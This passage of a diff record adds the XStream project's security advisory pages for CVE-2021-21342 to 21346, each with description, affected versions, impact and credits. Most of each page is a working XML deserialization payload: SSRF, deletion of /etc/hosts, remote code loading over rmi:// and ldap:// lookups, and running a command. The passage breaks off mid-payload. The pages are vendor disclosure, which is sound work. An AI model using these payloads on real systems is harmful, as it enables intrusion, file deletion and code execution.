          "86:     <p>The vulnerability was discovered and reported by threedr3am.</p>",
          "88:    </body>",
          "89:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21342.html||xstream-distribution/src/content/CVE-2021-21342.html": [
          "File: xstream-distribution/src/content/CVE-2021-21342.html -> xstream-distribution/src/content/CVE-2021-21342.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 12. January 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21342</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21342: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams",
          "20:     from an arbitrary URL referencing a resource in an intranet or the local host.</p>",
          "22:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "24:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "25:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "26:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "28:     <h2 id=\"description\">Description</h2>",
          "30:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "31:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "32:     input stream and replace or inject objects, that result in a server-side forgery request.</p>",
          "34:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "36:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "37:  unmarshal it again with XStream:</p>",
          "38: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "39:   &lt;unserializable-parents/&gt;",
          "40:   &lt;java.util.PriorityQueue&gt;",
          "41:     &lt;default&gt;",
          "42:       &lt;size&gt;2&lt;/size&gt;",
          "43:       &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt;",
          "44:         &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt;",
          "45:           &lt;packet&gt;",
          "46:             &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt;",
          "47:               &lt;dataSource class='javax.activation.URLDataSource'&gt;",
          "48:                 &lt;url&gt;http://localhost:8080/internal/:&lt;/url&gt;",
          "49:               &lt;/dataSource&gt;",
          "50:             &lt;/message&gt;",
          "51:           &lt;/packet&gt;",
          "52:         &lt;/indexMap&gt;",
          "53:       &lt;/comparator&gt;",
          "54:     &lt;/default&gt;",
          "55:     &lt;int&gt;3&lt;/int&gt;",
          "56:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "57:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "58:   &lt;/java.util.PriorityQueue&gt;",
          "59: &lt;/java.util.PriorityQueue&gt;",
          "60: </pre></div>",
          "61: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "62: xstream.fromXML(xml);",
          "63: </pre></div>",
          "65:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the data from the URL location is collected.</p>",
          "67:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "69:     <h2 id=\"impact\">Impact</h2>",
          "71:  <p>The vulnerability may allow a remote attacker to request data from internal resources that are not publicly",
          "72:  available only by manipulating the processed input stream.</p>",
          "74:     <h2 id=\"workarounds\">Workarounds</h2>",
          "76:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "78:     <h2 id=\"credits\">Credits</h2>",
          "80:     <p>\u949f\u6f66\u8d35 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "82:    </body>",
          "83:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21343.html||xstream-distribution/src/content/CVE-2021-21343.html": [
          "File: xstream-distribution/src/content/CVE-2021-21343.html -> xstream-distribution/src/content/CVE-2021-21343.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 16. January 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21343</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21343: XStream is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling as long",
          "20:     as the executing process has sufficient rights.</p>",
          "22:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "24:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "25:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "26:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "28:     <h2 id=\"description\">Description</h2>",
          "30:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "31:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "32:     input stream and replace or inject objects, that result in the deletion of a file on the local host.</p>",
          "34:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "36:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "37:  unmarshal it again with XStream:</p>",
          "38: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "39:   &lt;unserializable-parents/&gt;",
          "40:   &lt;java.util.PriorityQueue&gt;",
          "41:     &lt;default&gt;",
          "42:       &lt;size&gt;2&lt;/size&gt;",
          "43:       &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt;",
          "44:         &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt;",
          "45:           &lt;packet&gt;",
          "46:             &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt;",
          "47:               &lt;dataSource class='com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource'&gt;",
          "48:                 &lt;part&gt;",
          "49:                   &lt;dataHead&gt;",
          "50:                     &lt;tail/&gt;",
          "51:                     &lt;head&gt;",
          "52:                       &lt;data class='com.sun.xml.internal.org.jvnet.mimepull.MemoryData'&gt;",
          "53:                         &lt;len&gt;3&lt;/len&gt;",
          "54:                         &lt;data&gt;AQID&lt;/data&gt;",
          "55:                       &lt;/data&gt;",
          "56:                     &lt;/head&gt;",
          "57:                   &lt;/dataHead&gt;",
          "58:                   &lt;contentTransferEncoding&gt;base64&lt;/contentTransferEncoding&gt;",
          "59:                   &lt;msg&gt;",
          "60:                     &lt;it class='java.util.ArrayList$Itr'&gt;",
          "61:                       &lt;cursor&gt;0&lt;/cursor&gt;",
          "62:                       &lt;lastRet&gt;1&lt;/lastRet&gt;",
          "63:                       &lt;expectedModCount&gt;4&lt;/expectedModCount&gt;",
          "64:                         &lt;outer-class&gt;",
          "65:                           &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;",
          "66:                           &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;",
          "67:                           &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;",
          "68:                           &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;",
          "69:                         &lt;/outer-class&gt;",
          "70:                     &lt;/it&gt;",
          "71:                     &lt;in class='java.io.FileInputStream'&gt;",
          "72:                       &lt;fd/&gt;",
          "73:                       &lt;channel class='sun.nio.ch.FileChannelImpl'&gt;",
          "74:                         &lt;closeLock/&gt;",
          "75:                         &lt;open&gt;true&lt;/open&gt;",
          "76:                         &lt;threads&gt;",
          "77:                           &lt;used&gt;-1&lt;/used&gt;",
          "78:                         &lt;/threads&gt;",
          "79:                         &lt;parent class='sun.plugin2.ipc.unix.DomainSocketNamedPipe'&gt;",
          "80:                           &lt;sockClient&gt;",
          "81:                             &lt;fileName&gt;/etc/hosts&lt;/fileName&gt;",
          "82:                             &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;",
          "83:                           &lt;/sockClient&gt;",
          "84:                           &lt;connectionSync/&gt;",
          "85:                         &lt;/parent&gt;",
          "86:                       &lt;/channel&gt;",
          "87:                       &lt;closeLock/&gt;",
          "88:                     &lt;/in&gt;",
          "89:                   &lt;/msg&gt;",
          "90:                 &lt;/part&gt;",
          "91:               &lt;/dataSource&gt;",
          "92:             &lt;/message&gt;",
          "93:             &lt;satellites/&gt;",
          "94:             &lt;invocationProperties/&gt;",
          "95:           &lt;/packet&gt;",
          "96:         &lt;/indexMap&gt;",
          "97:       &lt;/comparator&gt;",
          "98:     &lt;/default&gt;",
          "99:     &lt;int&gt;3&lt;/int&gt;",
          "100:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "101:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "102:   &lt;/java.util.PriorityQueue&gt;",
          "103: &lt;/java.util.PriorityQueue&gt;",
          "104: </pre></div>",
          "105: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "106: xstream.fromXML(xml);",
          "107: </pre></div>",
          "109:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the references file is deleted.</p>",
          "111:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "113:     <h2 id=\"impact\">Impact</h2>",
          "115:  <p>The vulnerability may allow a remote attacker to delete arbitrary know files on the host as log as the executing",
          "116:  process has sufficient rights only by manipulating the processed input stream.</p>",
          "118:     <h2 id=\"workarounds\">Workarounds</h2>",
          "120:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "122:     <h2 id=\"credits\">Credits</h2>",
          "124:     <p>\u949f\u6f66\u8d35 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "126:    </body>",
          "127:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21344.html||xstream-distribution/src/content/CVE-2021-21344.html": [
          "File: xstream-distribution/src/content/CVE-2021-21344.html -> xstream-distribution/src/content/CVE-2021-21344.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 19. January 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21344</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21344: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:       &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt;",
          "43:         &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt;",
          "44:           &lt;packet&gt;",
          "45:             &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt;",
          "46:               &lt;dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'&gt;",
          "47:                 &lt;bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'&gt;",
          "48:                   &lt;bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'&gt;",
          "49:                     &lt;bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'&gt;",
          "50:                       &lt;jaxbType&gt;com.sun.rowset.JdbcRowSetImpl&lt;/jaxbType&gt;",
          "51:                       &lt;uriProperties/&gt;",
          "52:                       &lt;attributeProperties/&gt;",
          "53:                       &lt;inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'&gt;",
          "54:                         &lt;getter&gt;",
          "55:                           &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;",
          "56:                           &lt;name&gt;getDatabaseMetaData&lt;/name&gt;",
          "57:                           &lt;parameter-types/&gt;",
          "58:                         &lt;/getter&gt;",
          "59:                       &lt;/inheritedAttWildcard&gt;",
          "60:                     &lt;/bi&gt;",
          "61:                     &lt;tagName/&gt;",
          "62:                     &lt;context&gt;",
          "63:                       &lt;marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'&gt;",
          "64:                         &lt;outer-class reference='../..'/&gt;",
          "65:                       &lt;/marshallerPool&gt;",
          "66:                       &lt;nameList&gt;",
          "67:                         &lt;nsUriCannotBeDefaulted&gt;",
          "68:                           &lt;boolean&gt;true&lt;/boolean&gt;",
          "69:                         &lt;/nsUriCannotBeDefaulted&gt;",
          "70:                         &lt;namespaceURIs&gt;",
          "71:                           &lt;string&gt;1&lt;/string&gt;",
          "72:                         &lt;/namespaceURIs&gt;",
          "73:                         &lt;localNames&gt;",
          "74:                           &lt;string&gt;UTF-8&lt;/string&gt;",
          "75:                         &lt;/localNames&gt;",
          "76:                       &lt;/nameList&gt;",
          "77:                     &lt;/context&gt;",
          "78:                   &lt;/bridge&gt;",
          "79:                 &lt;/bridge&gt;",
          "80:                 &lt;jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt;",
          "81:                   &lt;javax.sql.rowset.BaseRowSet&gt;",
          "82:                     &lt;default&gt;",
          "83:                       &lt;concurrency&gt;1008&lt;/concurrency&gt;",
          "84:                       &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;",
          "85:                       &lt;fetchDir&gt;1000&lt;/fetchDir&gt;",
          "86:                       &lt;fetchSize&gt;0&lt;/fetchSize&gt;",
          "87:                       &lt;isolation&gt;2&lt;/isolation&gt;",
          "88:                       &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;",
          "89:                       &lt;maxRows&gt;0&lt;/maxRows&gt;",
          "90:                       &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;",
          "91:                       &lt;readOnly&gt;true&lt;/readOnly&gt;",
          "92:                       &lt;rowSetType&gt;1004&lt;/rowSetType&gt;",
          "93:                       &lt;showDeleted&gt;false&lt;/showDeleted&gt;",
          "94:                       &lt;dataSource&gt;rmi://localhost:15000/CallRemoteMethod&lt;/dataSource&gt;",
          "95:                       &lt;params/&gt;",
          "96:                     &lt;/default&gt;",
          "97:                   &lt;/javax.sql.rowset.BaseRowSet&gt;",
          "98:                   &lt;com.sun.rowset.JdbcRowSetImpl&gt;",
          "99:                     &lt;default&gt;",
          "100:                       &lt;iMatchColumns&gt;",
          "101:                         &lt;int&gt;-1&lt;/int&gt;",
          "102:                         &lt;int&gt;-1&lt;/int&gt;",
          "103:                         &lt;int&gt;-1&lt;/int&gt;",
          "104:                         &lt;int&gt;-1&lt;/int&gt;",
          "105:                         &lt;int&gt;-1&lt;/int&gt;",
          "106:                         &lt;int&gt;-1&lt;/int&gt;",
          "107:                         &lt;int&gt;-1&lt;/int&gt;",
          "108:                         &lt;int&gt;-1&lt;/int&gt;",
          "109:                         &lt;int&gt;-1&lt;/int&gt;",
          "110:                         &lt;int&gt;-1&lt;/int&gt;",
          "111:                       &lt;/iMatchColumns&gt;",
          "112:                       &lt;strMatchColumns&gt;",
          "113:                         &lt;string&gt;foo&lt;/string&gt;",
          "114:                         &lt;null/&gt;",
          "115:                         &lt;null/&gt;",
          "116:                         &lt;null/&gt;",
          "117:                         &lt;null/&gt;",
          "118:                         &lt;null/&gt;",
          "119:                         &lt;null/&gt;",
          "120:                         &lt;null/&gt;",
          "121:                         &lt;null/&gt;",
          "122:                         &lt;null/&gt;",
          "123:                       &lt;/strMatchColumns&gt;",
          "124:                     &lt;/default&gt;",
          "125:                   &lt;/com.sun.rowset.JdbcRowSetImpl&gt;",
          "126:                 &lt;/jaxbObject&gt;",
          "127:               &lt;/dataSource&gt;",
          "128:             &lt;/message&gt;",
          "129:             &lt;satellites/&gt;",
          "130:             &lt;invocationProperties/&gt;",
          "131:           &lt;/packet&gt;",
          "132:         &lt;/indexMap&gt;",
          "133:       &lt;/comparator&gt;",
          "134:     &lt;/default&gt;",
          "135:     &lt;int&gt;3&lt;/int&gt;",
          "136:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "137:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "138:   &lt;/java.util.PriorityQueue&gt;",
          "139: &lt;/java.util.PriorityQueue&gt;",
          "140: </pre></div>",
          "141: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "142: xstream.fromXML(xml);",
          "143: </pre></div>",
          "145:     <p>As soon as the XML gets unmarshalled, the code from the remote server is loaded and executed.</p>",
          "147:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "149:     <h2 id=\"impact\">Impact</h2>",
          "151:  <p>The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by",
          "152:  manipulating the processed input stream.</p>",
          "154:     <h2 id=\"workarounds\">Workarounds</h2>",
          "156:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "158:     <h2 id=\"credits\">Credits</h2>",
          "160:     <p>\u949f\u6f66\u8d35 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "162:    </body>",
          "163:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21345.html||xstream-distribution/src/content/CVE-2021-21345.html": [
          "File: xstream-distribution/src/content/CVE-2021-21345.html -> xstream-distribution/src/content/CVE-2021-21345.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 26. January 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21345</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21345: XStream is vulnerable to a Remote Command Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of a local command on the server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:       &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt;",
          "43:         &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt;",
          "44:           &lt;packet&gt;",
          "45:             &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt;",
          "46:               &lt;dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'&gt;",
          "47:                 &lt;bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'&gt;",
          "48:                   &lt;bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'&gt;",
          "49:                     &lt;bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'&gt;",
          "50:                       &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;",
          "51:                       &lt;uriProperties/&gt;",
          "52:                       &lt;attributeProperties/&gt;",
          "53:                       &lt;inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'&gt;",
          "54:                         &lt;getter&gt;",
          "55:                           &lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt;",
          "56:                           &lt;name&gt;verify&lt;/name&gt;",
          "57:                           &lt;parameter-types/&gt;",
          "58:                         &lt;/getter&gt;",
          "59:                       &lt;/inheritedAttWildcard&gt;",
          "60:                     &lt;/bi&gt;",
          "61:                     &lt;tagName/&gt;",
          "62:                     &lt;context&gt;",
          "63:                       &lt;marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'&gt;",
          "64:                         &lt;outer-class reference='../..'/&gt;",
          "65:                       &lt;/marshallerPool&gt;",
          "66:                       &lt;nameList&gt;",
          "67:                         &lt;nsUriCannotBeDefaulted&gt;",
          "68:                           &lt;boolean&gt;true&lt;/boolean&gt;",
          "69:                         &lt;/nsUriCannotBeDefaulted&gt;",
          "70:                         &lt;namespaceURIs&gt;",
          "71:                           &lt;string&gt;1&lt;/string&gt;",
          "72:                         &lt;/namespaceURIs&gt;",
          "73:                         &lt;localNames&gt;",
          "74:                           &lt;string&gt;UTF-8&lt;/string&gt;",
          "75:                         &lt;/localNames&gt;",
          "76:                       &lt;/nameList&gt;",
          "77:                     &lt;/context&gt;",
          "78:                   &lt;/bridge&gt;",
          "79:                 &lt;/bridge&gt;",
          "80:                 &lt;jaxbObject class='com.sun.corba.se.impl.activation.com.sun.corba.se.impl.activation.ServerTableEntry'&gt;",
          "81:                   &lt;activationCmd&gt;calc&lt;/activationCmd&gt;",
          "82:                 &lt;/jaxbObject&gt;",
          "83:               &lt;/dataSource&gt;",
          "84:             &lt;/message&gt;",
          "85:             &lt;satellites/&gt;",
          "86:             &lt;invocationProperties/&gt;",
          "87:           &lt;/packet&gt;",
          "88:         &lt;/indexMap&gt;",
          "89:       &lt;/comparator&gt;",
          "90:     &lt;/default&gt;",
          "91:     &lt;int&gt;3&lt;/int&gt;",
          "92:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "93:     &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;",
          "94:   &lt;/java.util.PriorityQueue&gt;",
          "95: &lt;/java.util.PriorityQueue&gt;",
          "96: </pre></div>",
          "97: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "98: xstream.fromXML(xml);",
          "99: </pre></div>",
          "101:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>",
          "103:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "105:     <h2 id=\"impact\">Impact</h2>",
          "107:  <p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by",
          "108:  manipulating the processed input stream.</p>",
          "110:     <h2 id=\"workarounds\">Workarounds</h2>",
          "112:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "114:     <h2 id=\"credits\">Credits</h2>",
          "116:     <p>\u949f\u6f66\u8d35 (Liaogui Zhong) found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "118:    </body>",
          "119:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21346.html||xstream-distribution/src/content/CVE-2021-21346.html": [
          "File: xstream-distribution/src/content/CVE-2021-21346.html -> xstream-distribution/src/content/CVE-2021-21346.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 29. January 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21346</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21346: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;sorted-set&gt;",
          "38:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "39:     &lt;type&gt;ysomap&lt;/type&gt;",
          "40:     &lt;value class='javax.swing.MultiUIDefaults' serialization='custom'&gt;",
          "41:       &lt;unserializable-parents/&gt;",
          "42:       &lt;hashtable&gt;",
          "43:         &lt;default&gt;",
          "44:           &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;",
          "45:           &lt;threshold&gt;525&lt;/threshold&gt;",
          "46:         &lt;/default&gt;",
          "47:         &lt;int&gt;700&lt;/int&gt;",
          "48:         &lt;int&gt;0&lt;/int&gt;",
          "49:       &lt;/hashtable&gt;",
          "50:       &lt;javax.swing.UIDefaults&gt;",
          "51:         &lt;default&gt;",
          "52:           &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;",
          "53:           &lt;resourceCache/&gt;",
          "54:         &lt;/default&gt;",
          "55:       &lt;/javax.swing.UIDefaults&gt;",
          "56:       &lt;javax.swing.MultiUIDefaults&gt;",
          "57:         &lt;default&gt;",
          "58:           &lt;tables&gt;",
          "59:             &lt;javax.swing.UIDefaults serialization='custom'&gt;",
          "60:               &lt;unserializable-parents/&gt;",
          "61:               &lt;hashtable&gt;",
          "62:                 &lt;default&gt;",
          "63:                   &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;",
          "64:                   &lt;threshold&gt;525&lt;/threshold&gt;",
          "65:                 &lt;/default&gt;",
          "66:                 &lt;int&gt;700&lt;/int&gt;",
          "67:                 &lt;int&gt;1&lt;/int&gt;",
          "68:                 &lt;sun.swing.SwingLazyValue&gt;",
          "69:                   &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;",
          "70:                   &lt;methodName&gt;doLookup&lt;/methodName&gt;",
          "71:                   &lt;args&gt;",
          "72:                     &lt;arg&gt;ldap://localhost:1099/CallRemoteMethod&lt;/arg&gt;",
          "73:                   &lt;/args&gt;",
          "74:                 &lt;/sun.swing.SwingLazyValue&gt;",
          "75:               &lt;/hashtable&gt;",
          "76:               &lt;javax.swing.UIDefaults&gt;",
          "77:                 &lt;default&gt;",
          "78:                   &lt;defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/&gt;",
          "79:                   &lt;resourceCache/&gt;",
          "80:                 &lt;/default&gt;",
          "81:               &lt;/javax.swing.UIDefaults&gt;",
          "82:             &lt;/javax.swing.UIDefaults&gt;",
          "83:           &lt;/tables&gt;",
          "84:         &lt;/default&gt;",
          "85:       &lt;/javax.swing.MultiUIDefaults&gt;",
          "86:     &lt;/value&gt;",
          "87:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "88:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
